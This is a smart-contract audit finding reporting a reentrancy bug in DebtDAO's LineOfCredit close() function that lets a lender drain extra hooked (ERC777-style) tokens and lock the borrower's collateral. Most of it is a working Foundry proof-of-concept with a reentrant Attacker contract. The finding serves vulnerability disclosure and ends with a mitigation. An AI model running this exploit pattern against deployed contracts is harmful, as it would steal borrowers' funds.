## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- judge review requested
- selected for report
- edited-by-warden
- M-06

# [The lender can draw out extra credit token from borrower's account](https://github.com/code-423n4/2022-11-debtdao-findings/issues/176) 

# Lines of code

https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488


# Vulnerability details

## Impact
When the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower's account. And the 'count' state variable would also be underflowed, cause the line contract can't be 'REPAID', the borrower will never be able to get back the collateral.

P.S.
Similar attack on imBTC https://zengo.com/imbtc-defi-hack-explained/

## Proof of Concept
The vulnerable point is in '_close()' function,
```
function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {
    // ...
    if (credit.deposit + credit.interestRepaid > 0) {
        LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here
            credit.token,
            credit.lender,
            credit.deposit + credit.interestRepaid
        );
    }
    // ...
}
```

The  following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under 'test' directory, it will pass
```
pragma solidity 0.8.9;

import "forge-std/Test.sol";
import { Denominations } from "chainlink/Denominations.sol";
import { Address } from "openzeppelin/utils/Address.sol";

import { Spigot } from "../modules/spigot/Spigot.sol";
import { Escrow } from "../modules/escrow/Escrow.sol";
import { SecuredLine } from "../modules/credit/SecuredLine.sol";
import { ILineOfCredit } from "../interfaces/ILineOfCredit.sol";
import { ISecuredLine } from "../interfaces/ISecuredLine.sol";

import { LineLib } from "../utils/LineLib.sol";
import { MutualConsent } from "../utils/MutualConsent.sol";

import { MockLine } from "../mock/MockLine.sol";
import { SimpleOracle } from "../mock/SimpleOracle.sol";
import { RevenueToken } from "../mock/RevenueToken.sol";


interface IHook {
    function tokensReceived(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract RevenueTokenWithHook is RevenueToken {
    using Address for address;
    mapping(address => bool) public registry;

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        super._afterTokenTransfer(from, to, amount);
        if (registry[to]) {
            IHook(to).tokensReceived(from, to, amount);
        }
    }

    function registerHook(address addr) external {
        registry[addr] = true;
    }
}

contract Attacker is IHook {
    uint256 constant ATTACK_COUNT = 10;
    SecuredLine line;
    address borrower;
    RevenueTokenWithHook token;
    uint256 count;
    bool attackEnable;
    constructor(address line_, address borrower_, address token_) {
        line = SecuredLine(payable(line_));
        borrower = borrower_;
        token = RevenueTokenWithHook(token_);
        token.registerHook(address(this));
    }
    function tokensReceived(
            address,
            address,
            uint256
        ) external {
        if (msg.sender != address(token)) return;
        if (!attackEnable) return;
        uint256 count_ = count;
        if (count_ >= ATTACK_COUNT) return;
        count = count_ + 1;
        bytes32 id = line.ids(0);
        (uint256 deposit,,,,,,) = line.credits(id);
        token.transfer(address(line), deposit);
        line.close(id);
    }

    function enableAttack() external {
        attackEnable = true;
    }
}


contract ExploitCloseFunctionTest is Test {
    uint256 constant ONE_YEAR = 365.25 days;
    uint256 constant ATTACK_COUNT = 10;
    Escrow escrow;
    Spigot spigot;
    RevenueTokenWithHook supportedToken1;
    RevenueToken supportedToken2;
    RevenueToken unsupportedToken;
    SimpleOracle oracle;
    SecuredLine line;
    uint mintAmount = 100 ether;
    uint MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
    uint32 minCollateralRatio = 10000; // 100%
    uint128 dRate = 100;
    uint128 fRate = 1;
    uint ttl = ONE_YEAR;

    address borrower;
    address arbiter;
    address lender;

    function setUp() public {
        borrower = address(20);
        arbiter = address(this);
        supportedToken1 = new RevenueTokenWithHook();
        supportedToken2 = new RevenueToken();
        unsupportedToken = new RevenueToken();

        spigot = new Spigot(arbiter, borrower, borrower);
        oracle = new SimpleOracle(address(supportedToken1), address(supportedToken2));

        escrow = new Escrow(minCollateralRatio, address(oracle), arbiter, borrower);

        line = new SecuredLine(
          address(oracle),
          arbiter,
          borrower,
          payable(address(0)),
          address(spigot),
          address(escrow),
          ONE_YEAR,
          0
        );
        lender = address(new Attacker(address(line), borrower, address(supportedToken1)));
        assertEq(supportedToken1.registry(lender), true);
        
        escrow.updateLine(address(line));
        spigot.updateOwner(address(line));
        
        assertEq(uint(line.init()), uint(LineLib.STATUS.ACTIVE));

        _mintAndApprove();
        escrow.enableCollateral( address(supportedToken1));
        escrow.enableCollateral( address(supportedToken2));
   
        vm.startPrank(borrower);
        escrow.addCollateral(1 ether, address(supportedToken2));
        vm.stopPrank();
    }

    function testExpoit() public {
        _addCredit(address(supportedToken1), 1 ether);
        bytes32 id = line.ids(0);
        vm.warp(line.deadline() - ttl / 2);
        line.accrueInterest();
        (uint256 deposit, , uint256 interestAccrued, , , , ) = line.credits(id);
        uint256 lenderBalanceBefore = supportedToken1.balanceOf(lender);
        uint256 lenderBalanceAfterExpected = lenderBalanceBefore + deposit + interestAccrued;

        Attacker(lender).enableAttack();
        hoax(lender);
        line.close(id);
        vm.stopPrank();
        uint256 lenderBalanceAfter = supportedToken1.balanceOf(lender);
        assertEq(lenderBalanceAfter, lenderBalanceAfterExpected + interestAccrued * ATTACK_COUNT);
        (uint256 count,) = line.counts();
        assertEq(count, MAX_INT - ATTACK_COUNT + 1);
    }


    function _mintAndApprove() internal {
        deal(lender, mintAmount);

        supportedToken1.mint(borrower, mintAmount);
        supportedToken1.mint(lender, mintAmount);
        supportedToken2.mint(borrower, mintAmount);
        supportedToken2.mint(lender, mintAmount);
        unsupportedToken.mint(borrower, mintAmount);
        unsupportedToken.mint(lender, mintAmount);

        vm.startPrank(borrower);
        supportedToken1.approve(address(escrow), MAX_INT);
        supportedToken1.approve(address(line), MAX_INT);
        supportedToken2.approve(address(escrow), MAX_INT);
        supportedToken2.approve(address(line), MAX_INT);
        unsupportedToken.approve(address(escrow), MAX_INT);
        unsupportedToken.approve(address(line), MAX_INT);
        vm.stopPrank();

        vm.startPrank(lender);
        supportedToken1.approve(address(escrow), MAX_INT);
        supportedToken1.approve(address(line), MAX_INT);
        supportedToken2.approve(address(escrow), MAX_INT);
        supportedToken2.approve(address(line), MAX_INT);
        unsupportedToken.approve(address(escrow), MAX_INT);
        unsupportedToken.approve(address(line), MAX_INT);
        vm.stopPrank();

    }

    function _addCredit(address token, uint256 amount) public {
        hoax(borrower);
        line.addCredit(dRate, fRate, amount, token, lender);
        vm.stopPrank();
        hoax(lender);
        line.addCredit(dRate, fRate, amount, token, lender);
        vm.stopPrank();
    }

    receive() external payable {}
}

```

Related links:
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488
https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L173

## Tools Used
VS Code

## Recommended Mitigation Steps
Add reentrancy protection on 'close()' function.